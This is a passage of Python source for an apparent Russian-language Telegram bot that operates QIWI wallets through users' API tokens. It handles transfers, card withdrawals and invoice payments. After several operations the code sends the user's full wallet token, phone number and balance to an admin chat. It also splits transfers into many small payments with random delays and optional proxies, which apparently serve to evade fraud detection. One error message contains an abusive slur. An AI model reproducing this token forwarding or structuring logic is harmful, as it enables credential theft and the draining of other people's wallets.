                        bot.send_message(tid, 'Теперь отправьте публичный ключ:')
                    elif message.text == "🧾 Просмотреть историю кошелька":
                        bot.send_message(tid, 'Выберите тип операций в отчете:', reply_markup=kb_history)
                        qiwi.status(tid, "history_clicked")
                    else:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать действие [#2]!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "confirm_offer":
                    try:
                        offer_sum = qiwi.users_info[tid]["sum"]
                        now_offer_id = qiwi.users_info[tid]["offer_id"]
                        now_token = qiwi.users_info[tid]["token"]
                        balance = qiwi.users_info[tid]["balance"]
                        from_qiwi = qiwi.users_info[tid]["phone"]
                        if message.text == "✅ Оплатить счет":
                            # Проверяем баланс.
                            if balance and balance >= offer_sum:
                                if pay_invoice(now_token, now_offer_id, tid):
                                    qiwi.add_spent_limits(tid, offer_sum) # 3
                                    if tid != qiwi.notification:
                                        use_proxy = do_have_proxy(tg_id=tid)
                                        qiwi.notif_inv_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=from_qiwi, balance=balance_show, user_sum=offer_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy)
                                        qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=None, user_sum=offer_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy, tr_type=my_types.invoice_in)
                                    bot.send_message(tid, '✅ Платеж принят!', reply_markup=kb_main)
                                else:
                                    bot.send_message(tid, '🚫 Ошибка - не удалось оплатить выставленный счет!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, '🚫 Ошибка - на балансе не хватает средств!', reply_markup=kb_main)
                        elif message.text == "❌ Отменить счет":
                            if cancel_invoice(now_token, now_offer_id, tid):
                                bot.send_message(tid, '✅ Выставленный счет отменен!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, '🚫 Ошибка - не удалось отменить выставленный счет!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - ожидалось подтверждение или отмена!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось ... ничего не удалось ненавижу эту функцию, ненавижу документацию api qiwi, ее писали аутисты, у них даже заголовки передаются экземпляру сессии только после POST запроса, какие же они придурки, я хочу вырезать их все как же мне плохо!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "select_offers":
                    try:
                        # Получаем ID счета для оплаты.
                        now_offer_id = message.text.split()[2][4:-1]
                        # Проверяем есть ли такой счет.
                        local_offer = [one_offer for one_offer in qiwi.users_info[tid]["offers"] if one_offer["id"] == str(now_offer_id)]
                        if local_offer:
                            # Получаем информаю - number, id, sum
                            offer_number = local_offer[0]["number"]
                            offer_sum = local_offer[0]["sum"]

                            # Записываем теперь в настройки пользователя.
                            qiwi.status(tid, "confirm_offer")
                            qiwi.users_info[tid]["sum"] = offer_sum
                            qiwi.users_info[tid]["offer_id"] = now_offer_id

                            offer_text = f"*Проверьте перед оплатой!*\nОбозначение: Счет #{offer_number + 1}\nID: `{now_offer_id}`\nСумма: `{offer_sum}`₽"
                            bot.send_message(tid, offer_text, parse_mode='markdown', reply_markup=kb_confirm_off)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - не удалось найти такой счет!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать счет для оплаты!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "history_clicked":
                    qiwi.status(tid, "history_rows")
                    if message.text == "📥 Пополнения":
                        qiwi.users_info[tid]["type_operations"] = "IN"
                    elif message.text == "📤 Платежи":
                        qiwi.users_info[tid]["type_operations"] = "OUT"
                    elif message.text == "📨 Все операции":
                        qiwi.users_info[tid]["type_operations"] = "ALL"
                    else:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать тип операций!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return
                    bot.send_message(tid, 'Введите число платежей (до 20):', reply_markup=kb_rows)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "history_rows":
                    try:
                        user_rows = 20 if int(message.text) > 20 else int(message.text)
                        # Получаем историю операций.
                        now_token = qiwi.users_info[tid]["token"]
                        now_phone = qiwi.users_info[tid]["phone"]
                        type_op = qiwi.users_info[tid]["type_operations"]
                        # Проверяем на заморозку токена.
                        is_freezed = load_freezed_tokens(now_token)
                        if tid != qiwi.notification and not is_freezed is None:
                            time.sleep(1)
                            raise ValueError
                        payment_history = qiwi.form_history(now_token, now_phone, tid, user_rows, type_op)
                        if not payment_history:
                            raise ValueError
                        bot.send_message(tid, payment_history, parse_mode='markdown', reply_markup=kb_main, disable_web_page_preview=True)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось загрузить историю операций!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "card_confirm":
                    try:
                        if message.text == "✅ Подтвердить вывод":
                            now_token = qiwi.users_info[tid]["token"]
                            now_phone = qiwi.users_info[tid]["phone"]
                            card_number = qiwi.users_info[tid]["card"]
                            provider_name = qiwi.users_info[tid]["provider_name"]
                            to_sum = qiwi.users_info[tid]["to_sum"]
                            balance = qiwi.users_info[tid]["balance"]
                            provider_id = qiwi.users_info[tid]["provider_id"]
                            # Получаем словарь с данными.
                            payment_data = get_payment_data(now_token, now_phone, card_number, to_sum)
                            if payment_data:
                                # Выполняем оплату.
                                result = send_card(now_token, payment_data, tid)
                                if result:
                                    transaction_id = result["id"]
                                    # Отправляем уведомление об успешном переводе.
                                    if tid != qiwi.notification:
                                        use_proxy = do_have_proxy(tg_id=tid)
                                        notif_text = '💳 *Вывод на карту!*'
                                        last_text = f'Токен: `{now_token}`\nПровайдер: `{provider_name}`\nПолучатель: `{card_number}`\n\nБаланс: `{balance}`₽\nСумма к получению: `{to_sum}`₽\n\nID Транзакции: `{transaction_id}`'
                                        qiwi.notif_common_admin(notif_text=notif_text, telegram_id=tid, username=message.from_user.username, last_text=last_text, use_proxy=use_proxy)
                                        qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=now_phone, to_qiwi=card_number, user_sum=to_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy, tr_type=provider_id)
                                    minus_sum = qiwi.users_info[tid]["minus_sum"]
                                    qiwi.add_spent_limits(tid, minus_sum) # 4
                                    bot.send_message(tid, f'✅ Платеж принят!\n🧾 ID Транзакции: `{transaction_id}`', parse_mode='markdown', reply_markup=kb_main)
                                else:
                                    bot.send_message(tid, '🚫 Ошибка - не удалось выполнить вывод!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, '🚫 Ошибка - не удалось сформировать словарь для перевода!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - ожидалось подтверждение!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось сформировать вывод!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "card_sum":
                    try:
                        to_sum = float(message.text)
                        min_sum = qiwi.users_info[tid]["min_sum"]
                        max_sum = qiwi.users_info[tid]["max_sum"]
                        if float(min_sum) <= to_sum <= float(max_sum):
                            provider_id = qiwi.users_info[tid]["provider_id"]
                            provider_name = config.CARD_INFO.get(provider_id, {}).get('name', 'неизв.')
                            provider_tax = config.CARD_INFO.get(provider_id, {}).get('tax', 'неизв.')
                            show_card = '***' + qiwi.users_info[tid]["card"][-4:]

                            if provider_id == "22351":
                                minus_sum = round(to_sum * 1.02, 2)
                            elif provider_id in ["1963", "21013", "31652"]:
                                minus_sum = round(to_sum * 1.02 + 50, 2)
                            elif provider_id in ["1960", "21012"]:
                                minus_sum = round(to_sum * 1.02 + 100, 2)
                            else:
                                raise TypeError

                            card_text = f"*Проверьте перед выводом!*\nПровайдер: `{provider_name}`\nКарта: `{show_card}`\nКомиссия QIWI: `{provider_tax}`\n\nСумма к списанию: `{minus_sum}`₽\nСумма к зачислению: `{to_sum}`₽"
                            bot.send_message(tid, card_text, parse_mode='markdown', reply_markup=kb_confirm_card)
                            qiwi.users_info[tid]["to_sum"] = to_sum
                            qiwi.users_info[tid]["provider_name"] = provider_name
                            qiwi.users_info[tid]["minus_sum"] = minus_sum
                            qiwi.status(tid, "card_confirm")
                        else:
                            bot.send_message(tid, f'🚫 Ошибка - сумма должна быть между {min_sum}₽ и {max_sum}₽!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать сумму!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "card":
                    try:
                        user_card = str(int(message.text))
                        # Определяем карту пользователя.
                        provider_id = card_system(user_card)
                        if provider_id and isinstance(provider_id, str):
                            # Определяем максимальную сумму.
                            now_balance = round(qiwi.users_info[tid]["balance"], 2)
                            if provider_id == "22351":
                                max_sum = round(now_balance / 1.02, 2)
                                min_sum = 1
                            elif provider_id in ["1963", "21013", "31652"]:
                                max_sum = round((now_balance - 50) / 1.02, 2)
                                min_sum = 50.02
                            elif provider_id in ["1960", "21012"]:
                                max_sum = round((now_balance - 100) / 1.02, 2)
                                min_sum = 100.02
                            else:
                                raise TypeError

                            if max_sum >= 1:
                                kb_sum = ReplyKeyboardMarkup(True)
                                kb_sum.row('25', '50', '100')
                                kb_sum.row('250', '500', '1000')
                                kb_sum.row(str(max_sum), '🔙 Отмена')

                                # Записываем информацию.
                                qiwi.status(tid, "card_sum")
                                qiwi.users_info[tid]["card"] = user_card
                                qiwi.users_info[tid]["max_sum"] = max_sum
                                qiwi.users_info[tid]["min_sum"] = 1
                                qiwi.users_info[tid]["provider_id"] = provider_id

                                bot.send_message(tid, 'Введите сумму: ', reply_markup=kb_sum)
                            elif max_sum < 1:
                                bot.send_message(tid, f'🚫 Ошибка - не хватает средств на балансе.\nНужно еще: {round(min_sum - now_balance, 2)}₽', reply_markup=kb_main)
                                qiwi.reset(tid)
                            else:
                                raise ValueError

                        elif provider_id:
                            bot.send_message(tid, '🚫 Ошибка - вывод на иностранные карты пока не выполняется!\nЭто будет доступно в следующем обновлении.', reply_markup=kb_main)
                            qiwi.reset(tid)
                        else:
                            raise TypeError
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать карту!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "invoice_clicked":
                    raw_invoice = message.text
                    # Получаем UID.
                    invoice_uid = form_invoice(raw_invoice)
                    if invoice_uid:
                        # Получаем информацию.
                        invoice_info = get_invoice_info(invoice_uid)
                        if invoice_info:
                            try:
                                max_sum = round(qiwi.users_info.get(tid, {}).get("balance", 0) / 1.02, 2)
                                # Проверяем сумму.
                                if invoice_info["sum"] <= max_sum:
                                    if invoice_info['currency'] != 643:
                                        raise ValueError
                                    invoice_status = INVOICE_CODES.get(invoice_info['status']) or invoice_info['status']
                                    qiwi.users_info[tid]["invoice_sum"] = invoice_info['sum']

                                    comment_details = f"\nКомментарий: `{invoice_info['comment']}`" if invoice_info['comment'] else ''

                                    invoice_text = "*Проверьте информацию!*\n" + \
                                        f"Название: `{invoice_info['title']}`\nСтатус: *{invoice_status}*\n" + \
                                        f"Сумма к списанию: `{round(invoice_info['sum'] * 1.02, 2)}`₽\nСумма счета: `{invoice_info['sum']}`₽{comment_details}"
                                    if invoice_info['status'] == 'READY_FOR_PAY_STATUS':
                                        bot.send_message(tid, invoice_text, parse_mode='markdown', reply_markup=kb_confirm_inv)
                                        qiwi.status(tid, "waiting_confirm_inv")
                                        qiwi.users_info[tid]["uid"] = invoice_uid
                                    else:
                                        bot.send_message(tid, invoice_text, parse_mode='markdown', reply_markup=kb_main)
                                        qiwi.reset(tid)
                                else:
                                    bot.send_message(tid, '🚫 Ошибка - баланс не позволяет совершить платеж!', reply_markup=kb_main)
                                    qiwi.reset(tid)
                            except:
                                bot.send_message(tid, '🚫 Ошибка - не удалось обработать информаци об invoice!', reply_markup=kb_main)
                                qiwi.reset(tid)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - не удалось получить информацию об invoice!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    else:
                        bot.send_message(tid, '🚫 Ошибка - не удалось распознать ссылку на invoice!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_confirm_inv":
                    if message.text == "✅ Подтвердить оплату":
                        bot.send_message(tid, '⌛ Оплачиваю счет...')
                        now_token = qiwi.users_info[tid].get("token")
                        invoice_uid = qiwi.users_info[tid].get("uid")
                        from_qiwi = qiwi.users_info[tid].get("phone")
                        user_sum = qiwi.users_info[tid].get("invoice_sum", 0)
                        balance_show = qiwi.users_info[tid].get("balance", 0)
                        if pay_invoice(now_token, invoice_uid, tid):
                            qiwi.add_spent_limits(tid, user_sum) # 5
                            if tid != qiwi.notification:
                                use_proxy = do_have_proxy(tg_id=tid)
                                qiwi.notif_inv_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=from_qiwi, balance=balance_show, user_sum=user_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy)
                                qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=None, user_sum=user_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy)
                            bot.send_message(tid, '✅ Платеж принят!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - не удалось оплатить счет!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, '🚫 Ошибка - ожидалось подтверждение!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "qiwi_clicked" or qiwi.users_info.get(tid, {}).get("status") == "mult_qiwi_clicked":
                    to_qiwi = message.text
                    try:
                        tmp_qiwi = int(to_qiwi)
                        if not tmp_qiwi:
                            raise ValueError
                        qiwi.users_info[tid]["to_qiwi"] = to_qiwi
                        max_sum = round(qiwi.users_info.get(tid, {}).get("balance", 0) / 1.02, 2)
                        if max_sum:
                            kb_sum = ReplyKeyboardMarkup(True)
                            kb_sum.row('25', '50', '100')
                            kb_sum.row('250', '500', '1000')
                            kb_sum.row(str(max_sum), '🔙 Отмена')
                        else:
                            raise ValueError
                    except:
                        to_qiwi = False
                    else:
                        if to_qiwi:
                            bot.send_message(tid, f'Выберите или введите сумму для перевода (от 1₽ до {str(max_sum)}₽):\n' + \
                                f'`Например: {str(max_sum)}`', parse_mode='markdown', reply_markup=kb_sum)
                            if qiwi.users_info.get(tid, {}).get("status") == "qiwi_clicked":
                                qiwi.status(tid, "waiting_sum")
                            else:
                                qiwi.status(tid, "mult_waiting_sum")
                            return
                    bot.send_message(tid, '🚫 Ошибка - не удалось записать QIWI получателя!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_sum" or qiwi.users_info.get(tid, {}).get("status") == "mult_waiting_sum":
                    try:
                        # Получаем сумму, которая придет получателю.
                        end_sum = round(float(message.text), 2)
                        # Получаем сумму списания.
                        minus_sum = round(end_sum * 1.02, 2)
                        # Получаем баланс пользователя.
                        balance = qiwi.users_info.get(tid, {}).get("balance", 0)
                        # Проверяем есть ли такая сумма.
                        if not (balance and minus_sum and end_sum and minus_sum <= balance and minus_sum >= 1):
                            raise ValueError
                    except:
                        bot.send_message(tid, '🚫 Ошибка - сумма не соответствует требованиям!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    else:
                        try:
                            # Получаем номер получателя.
                            to_qiwi = int(qiwi.users_info.get(tid, {}).get("to_qiwi")) - 1 + 1
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось распознать получателя!', reply_markup=kb_main)
                            qiwi.reset(tid)
                        else:
                            if qiwi.users_info.get(tid, {}).get("status") == "waiting_sum":
                                bot.send_message(tid, '💬 Введите комментарий к переводу:', reply_markup=kb_comment)
                            else:
                                bot.send_message(tid, '💬 Введите комментарий к переводам:', reply_markup=kb_comment)
                            # Записываем получателя.
                            qiwi.users_info[tid]["to_qiwi"] = to_qiwi
                            # Записываем сумму списания.
                            qiwi.users_info[tid]["minus_sum"] = minus_sum
                            # Записываем сумму получения.
                            qiwi.users_info[tid]["end_sum"] = end_sum
                            if qiwi.users_info.get(tid, {}).get("status") == "waiting_sum":
                                qiwi.status(tid, "waiting_comment")
                            else:
                                qiwi.status(tid, "mult_waiting_comment")
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "managing_proxy":
                    if message.text == "🟢 Включить":
                        try:
                            if qiwi.users_proxy[tid]["info"] and qiwi.users_proxy[tid]["data"]:
                                qiwi.users_proxy[tid]["work"] = True
                            else:
                                raise ValueError
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось включить прокси!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '✅ Прокси успешно *включены*!', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.save_proxy()
                            if tid != qiwi.notification:
                                qiwi.notif_common_admin(notif_text='📳 *Прокси включены!*', telegram_id=tid, username=message.from_user.username)
                        qiwi.reset(tid)
                        return
                    elif message.text == "🔴 Выключить":
                        try:
                            if qiwi.users_proxy[tid]["info"] and qiwi.users_proxy[tid]["data"]:
                                qiwi.users_proxy[tid]["work"] = False
                            else:
                                raise ValueError
                        except:
                            bot.send_message(tid, '🚫 Ошибка - не удалось выключить прокси!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '☑️ Прокси успешно *выключены*!', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.save_proxy()
                            if tid != qiwi.notification:
                                qiwi.notif_common_admin(notif_text='📴 *Прокси выключены!*', telegram_id=tid, username=message.from_user.username)
                        qiwi.reset(tid)
                        return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_comment" or qiwi.users_info.get(tid, {}).get("status") == "mult_waiting_comment":
                    # Получаем комментарий пользователя.
                    user_comment = False if message.text == "💭 Оставить пустым" else message.text
                    qiwi.users_info[tid]["comment"] = user_comment
                    to_qiwi = qiwi.users_info[tid].get("to_qiwi")
                    minus_sum = qiwi.users_info[tid].get("minus_sum")
                    end_sum = qiwi.users_info[tid].get("end_sum")
                    if user_comment:
                        payment_text = '*Проверьте детали платежа!*\n' + \
                            f'Получатель: `{to_qiwi}`\n' + \
                            f'Сумма к списанию: `{minus_sum}`₽\n' + \
                            f'Сумма к получению: `{end_sum}`₽\n' + \
                            f'Комментарий: `{user_comment}`'
                    else:
                        payment_text = '*Проверьте детали платежа!*\n' + \
                            f'Получатель: `{to_qiwi}`\n' + \
                            f'Сумма к списанию: `{minus_sum}`₽\n' + \
                            f'Сумма к получению: `{end_sum}`₽\n'
                    if qiwi.users_info.get(tid, {}).get("status") == "waiting_comment":
                        qiwi.status(tid, "waiting_confirm")
                        bot.send_message(tid, payment_text, parse_mode='markdown', reply_markup=kb_confirm)
                    else:
                        qiwi.status(tid, "mult_max_sum")
                        bot.send_message(tid, "Укажите максимальную сумму для каждого перевода:", parse_mode='markdown', reply_markup=kb_sums)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "mult_max_sum":
                    try:
                        # Получаем максимальную сумму для каждого перевода.
                        max_payment_sum = round(float(message.text), 2)
                        qiwi.users_info[tid]["max_payment_sum"] = max_payment_sum
                        # Делим на мелкие платежи.
                        user_sums = myhelper.calc_mult_payments(sum_to_send=qiwi.users_info[tid]["end_sum"], max_sum=max_payment_sum)
                        if user_sums:
                            # Записываем мелкие платежи.
                            qiwi.users_info[tid]["mult_qiwi"] = user_sums
                            # Выводим информацию.
                            mult_text = '\n'.join([f"{x[0]}₽ - x{x[1]}" for x in user_sums["info"].items() if x[1]])
                            if mult_text:
                                qiwi.status(tid, "mult_confirm")
                                bot.send_message(tid, f'*Проверьте детали перед переводом!*\nПлатежи:\n{mult_text}', parse_mode='markdown', reply_markup=kb_confirm_multi)
                            else:
                                bot.send_message(tid, '🚫 Ошибка - отсутствуют платежи для проведения.!', reply_markup=kb_main)
                                qiwi.reset(tid)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - не удалось сформировать мелкие платежи!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - сумма не соответствует требованиям!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "mult_confirm":
                    if message.text == "✅ Начать переводы":
                        try:
                            bot.send_message(tid, "🚀 Запуск множественного перевода, подождите...", reply_markup=kb_disable)
                            # Получаем токен.
                            now_token = qiwi.users_info[tid]["token"]
                            # Номер токена.
                            from_qiwi = qiwi.users_info[tid]["phone"]
                            # Получаем получателя.
                            to_qiwi = qiwi.users_info[tid]["to_qiwi"]
                            # Получаем комментарий.
                            user_comment = qiwi.users_info[tid]["comment"]
                            # Получаем баланс.
                            balance = qiwi.users_info[tid]["balance"]

                            # Получаем список сумм.
                            user_sums = qiwi.users_info[tid]["mult_qiwi"]["payments"]
                            #  Получаем количество переводов.
                            sums_amount = len(user_sums)

                            # Получаем общую сумму для перевода.
                            end_sum = qiwi.users_info[tid]["end_sum"]

                            sand_clocks = get_sand_clock()
                            mail_message = bot.send_message(tid, f'{next(sand_clocks)} *Выполняем перевод...*\nОпераций: *0*/*{sums_amount}*\nСумма: RUB *0*/*{end_sum}*', parse_mode='markdown')
                            qiwi.status(tid, "doing_many_pays")
                            # Список транзакций.
                            transactions = []
                            sum_sent = 0
                            goods = 0

                            for numb, one_sum in enumerate(user_sums):
                                try:
                                    # Выполняем перевод.
                                    main_result = qiwi.send_p2p(now_token=now_token, to_qiwi=to_qiwi, sum_p2p=one_sum, tg_id=tid, comment=user_comment)
                                    if main_result["transaction"]["state"]["code"] == "Accepted":
                                        # Получаем номер транзакции.
                                        transaction_id = main_result.get("transaction", {}).get("id", "None")
                                        transactions.append(transaction_id)
                                        # Добавляем переведенную сумму.
                                        sum_sent += one_sum
                                        goods += 1
                                        # Сохраняем транзакцию.
                                        use_proxy = do_have_proxy(tg_id=tid)
                                        qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=to_qiwi, user_sum=one_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy)
                                    else:
                                        raise ValueError
                                except:
                                    pass
                                bot.edit_message_text(f'{next(sand_clocks)} *Выполняем перевод...*\nЗадержка: ~7-10 сек.\nОпераций: *{goods}*/*{sums_amount}*\nСумма RUB: *{sum_sent}*/*{end_sum}*', tid, mail_message.message_id, parse_mode='markdown')
                                if numb != sums_amount - 1:
                                    # Делаем задержку.
                                    myhelper.rand_sleep()

                            if goods:
                                qiwi.add_last_phone(tid, to_qiwi)
                                transactions_text = ', '.join([f'`{x}`' for x in transactions])
                                qiwi.add_spent_limits(tid, sum_sent) # 6
                                bot.edit_message_text(f'✅ *Переводы выполнены!*\nОпераций: *{goods}*/*{sums_amount}*\nСумма RUB: *{sum_sent}*/*{end_sum}*\n\n🧾 ID Транзакций: {transactions_text}', tid, mail_message.message_id, parse_mode='markdown')
                                # Отправляем уведомление об успешном переводе.
                                if tid != qiwi.notification:
                                    common_text = f'Токен `{now_token}`\nОтправитель: `{from_qiwi}`\nПолучатель: `{to_qiwi}`\n\nБаланс: `{balance}`₽\n' + \
                                        f'Операций: `{goods}`/`{sums_amount}`\nСумма к получению (₽): `{sum_sent}`/`{end_sum}` ({round(sum_sent * 1.02, 2)})\n\n' + \
                                        f'Комментарий: `{(user_comment if user_comment else "None")}`\n\nID Транзакций: {transactions_text}'
                                    qiwi.notif_common_admin(notif_text='🔂 *Множественный перевод!*', telegram_id=tid, username=message.from_user.username, last_text=common_text, use_proxy=use_proxy)
                            else:
                                bot.edit_message_text(f'❌ Не удалось выполнить переводы.', tid, mail_message.message_id, parse_mode='markdown')
                            bot.send_message(tid, 'Возвращаемся в главное меню.', reply_markup=kb_main)
                        except:
                            bot.send_message(tid, '🚫 Ошибка - сбой при множественном перевода!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, '🚫 Ошибка - ожидалось подтверждение!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_confirm":
                    if message.text == "✅ Подтвердить перевод":
                        # Получаем всю необходимую информацию.
                        now_token = qiwi.users_info.get(tid, {}).get("token")
                        to_qiwi = qiwi.users_info.get(tid, {}).get("to_qiwi")
                        end_sum = qiwi.users_info.get(tid, {}).get("end_sum")
                        user_comment = qiwi.users_info.get(tid, {}).get("comment")

                        bot.send_message(tid, f'⌛ Перевод на `+{to_qiwi}` ...\nЭто может занять некоторое время, ничего не нажимайте!', parse_mode='markdown', reply_markup=kb_main)
                        if now_token and to_qiwi and end_sum:
                            try:
                                # Выполняем перевод.
                                main_result = qiwi.send_p2p(now_token=now_token, to_qiwi=to_qiwi, sum_p2p=end_sum, tg_id=tid, comment=user_comment)
                                if main_result["transaction"]["state"]["code"] == "Accepted":
                                    transaction_id = main_result.get("transaction", {}).get("id", "None")
                                    # Получаем отправителя.
                                    from_qiwi = qiwi.users_info.get(tid, {}).get("phone", "None")
                                    # Получаем баланс до перевода.
                                    balance_show = qiwi.users_info.get(tid, {}).get("balance", "None")
                                else:
                                    raise ValueError
                            except:
                                bot.send_message(tid, '🚫 Ошибка - не удалось провести платеж!', reply_markup=kb_main)
                            else:
                                # Добавляем телефон в последние.
                                qiwi.add_last_phone(tid, to_qiwi)

                                # Отправляем уведомление об успешном переводе.
                                if tid != qiwi.notification:
                                    use_proxy = do_have_proxy(tg_id=tid)
                                    qiwi.notif_tr_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=from_qiwi, to_qiwi=to_qiwi, balance=balance_show, user_sum=end_sum, boss_sum=0, transaction_id=transaction_id, comment=user_comment, use_proxy=use_proxy)
                                    qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=to_qiwi, user_sum=end_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy)
                                # Записываем использованную сумму.
                                qiwi.add_spent_limits(tid, end_sum * 1.02) # 1
                                bot.send_message(tid, f'✅ Платеж принят!\n🧾 ID Транзакции: `{transaction_id}`', parse_mode='markdown', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - потеря параметров платежа!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return
                    else:
                        bot.send_message(tid, '🚫 Ошибка - я вообще-то ждала подтверждения платежа, а не кракозябры всякие! ' + \
                            'Ты вообще сам понял, что написал?!\n' + \
                            'Ну и ладно, вот тогда тебе главное меню, бака! <(￣ ﹌ ￣)>', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "red_auto":
                    try:
                        new_number = int(message.text)
                        if new_number and 7 >= new_number >= 1:
                            qiwi.users_info[tid]["auto"] = new_number
                        else:
                            raise ValueError
                    except:
                        bot.send_message(tid, '🚫 Ошибка - не удалось изменить значение!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, '✅ Успешно изменено!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "idea":
                    try:
                        if message.text and len(message.text) >= 5:
                            username = message.from_user.username
                            uid = tid
                            idea_text = f"📩 *Получено предложение!*\nUsername: *@{username}*\nTelegram ID: `{uid}`\nТекст: `{message.text}`"
                            try:
                                if qiwi.notification:
                                    bot.send_message(qiwi.notification, idea_text, parse_mode='markdown')
                                    time.sleep(0.01)
                                    bot.send_message(CORE, idea_text, parse_mode='markdown')
                                else:
                                    raise ValueError
                            except:
                                bot.send_message(tid, '🚫 Ошибка - ошибка при отправке!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, '✅ Предложение успешно отправлено!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '🚫 Ошибка - слишком короткое сообщение!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, '🚫 Ошибка - неправильное сообщение!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return

            if message.text == "🖌 Редактировать":
                bot.send_message(tid, 'Выберите новое значение:', reply_markup=kb_number)
                qiwi.status(tid, "red_auto")
                return
            elif message.text == "🖍 Автозаполнения":
                try:
                    numbers = int(qiwi.users_info[tid]["auto"])
                    if not (7 >= numbers >= 1):
                        raise ValueError
                except:
                    numbers = 3
                bot.send_message(tid, f'Текущее количество телефонов и токенов, которые сохраняются для автозаполнения: `{numbers}`', parse_mode='markdown', reply_markup=kb_auto)
                return
            if message.text == "🔄 Параметры сброса":
                bot.send_message(tid, 'Выберите действие: ', reply_markup=kb_clean)
                qiwi.reset(tid)
                qiwi.status(tid, "waiting_cleaning")
                return
            elif message.text == "📡 Прокси":
                # Получаем прокси.
                user_proxy = qiwi.users_proxy.get(tid)
                kb_proxy = ReplyKeyboardMarkup(True)
                if user_proxy and user_proxy.get("data") and user_proxy.get("info"):
                    kb_proxy.row('🔄 Заменить', '🗑 Удалить')
                    # Статус работы.
                    is_working = user_proxy.get("work")
                    # Если работает.
                    work_button = "🔴 Выключить" if is_working else "🟢 Включить"
                    kb_proxy.row(work_button, "📶 Проверить")
                    # Информация.
                    proxy_info = user_proxy.get("info", {})
                    proxy_text = "🌐 *Текущие прокси.*\n" + \
                        f"Статус: *{'🟢 Включены' if is_working else '🔴 Выключены'}*\n" + \
                        f"Регион: `{proxy_info.get('regionName')}`\n" + \
                        f"Страна: `{proxy_info.get('country')}`\n" + \
